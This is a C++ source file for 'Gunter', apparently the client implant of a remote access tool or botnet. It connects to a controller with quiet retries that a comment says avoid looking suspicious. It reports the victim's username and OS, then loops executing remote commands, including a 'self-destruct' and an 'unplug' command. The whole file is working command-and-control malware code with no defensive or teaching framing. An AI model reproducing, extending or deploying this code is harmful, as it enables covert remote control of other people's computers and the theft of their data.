#include "controller/client.hpp"
#include <iostream>

Gunter::Gunter(const credentials_t &creds)
    : io_context(),        // Initialize io_context
      socket(io_context),  // Initialize socket with io_context
      credentials(creds) {  // Initialize credentials
        
}

void Gunter::reconnect() {
    this->reconnect(this->credentials.timeout);
}

void Gunter::reconnect(int sec) {
    // disconnect
    this->disconnect();

    // reconnect again, with a delay
    Sleep(sec * 1000);

    this->connect();
}

void Gunter::disconnect() {
    if (this->socket.is_open()) {
        asio::error_code ec;
        this->socket.shutdown(tcp::socket::shutdown_both, ec);
        this->socket.close(ec);
        if (ec) {
            LOG("error during disconnect: " + ec.message());
        } else {
            LOG("disconnected!"); 
        }
    }
}

void Gunter::connect() {
    LOG("connecting ...");
    try {
        // error handling
        asio::error_code err_code;

        // make the endpoin
        tcp::endpoint endpoint(
            asio::ip::make_address(this->credentials.ip, err_code),
            this->credentials.port
        );

        if (err_code)
            return;

        bool is_connected = false;

        //  loop until the server response
        do {
            // attempt to connect
            this->socket.connect(endpoint, err_code);

            // update the status based on is it open and no error occured
            is_connected = this->socket.is_open() && !err_code;

            // if not connected, sleep for ammount of seconds and try again
            // this method is to prevent many requests that will be suspicious
            if (!is_connected) {
                Sleep(this->credentials.timeout * 1000);
                LOG("reconnecting ...");
            }

        } while (!is_connected);

        // finally invoke the connected function
        this->connected();
  } catch(std::exception& err) {
      LOG(err.what());
    }
}

void Gunter::connected() {
    LOG("connected");

    // 0. send request (json)
    picojson::object request;

    // about the host
    const char* os = std::getenv("OS");
    const char* host = std::getenv("USERNAME");

    request["hostname"] = picojson::value(host ? host : "<unknow>");
    request["system"] = picojson::value(os ? os : "<unknown>");

    // about the payload
    request["username"] = picojson::value(this->credentials.user);
    request["tag"] = picojson::value(this->credentials.tag);

    #ifdef __G_VERSION
    request["version"] = picojson::value(__G_VERSION);
    #else
    request["version"] = picojson::value("<unknown>");
    #endif

    // dump and send
    size_t sent = send(this->socket, picojson::value(request).serialize());

    // 1. wait for acknowledgment
    std::string ack_code = ack(this->socket, true);

    if (sent > 0 && ack_code == Codes::ACK) {
        // 2. serve (wait for commands)
        this->serve();
    }
    else if (sent > 0 && ack_code == Codes::KILL) {
        LOG("got rejected!");
        this->disconnect();
    }
    else {
        LOG("couldn't login!");
        this->reconnect();
    }

}

void Gunter::serve() {
    // wait for a command
    std::string command = recv(this->socket);

    if (command.empty()) {
        // reconnect if the message is empty, probably server/cpanel disconnected
        this->reconnect(); 
    }

    // parse and validate
    picojson::object parsed_command = parse_json(command);
    
    // make use of the pre defined command, as it is no longer needed
    command.clear();

    picojson::object args;

    if (parsed_command["command"].is<std::string>()) {
        command = parsed_command["command"].get<std::string>();
    }

    if (parsed_command["args"].is<picojson::object>()) {
        args = parsed_command["args"].get<picojson::object>();
    }

    if (command.empty()) {
        send(this->socket, com::make_response("error", "command not provided!"));
    }
    else {
        // handle general commands
        if (command == G_KILL) {
            // inform server
            send(this->socket, com::make_response("info", "self-destruct activated!"));

            // disconnect
            this->disconnect();

            // break the recursion
            return;
        }
        else if (command == G_UNPLUG) {
            send(this->socket, com::make_response("info", "I'll be back."));

            if (args["duration"].is<double>()) {
                this->reconnect(std::abs(args["duration"].get<double>()));
            } else {
                this->reconnect();
            }
        }
        else {
            // make the runner execute the command
            send(this->socket, runner::run_command(command, args));
        }
    }

    // wait for other command if the socket still open
    if (this->socket.is_open()) {
        this->serve();
    }
}
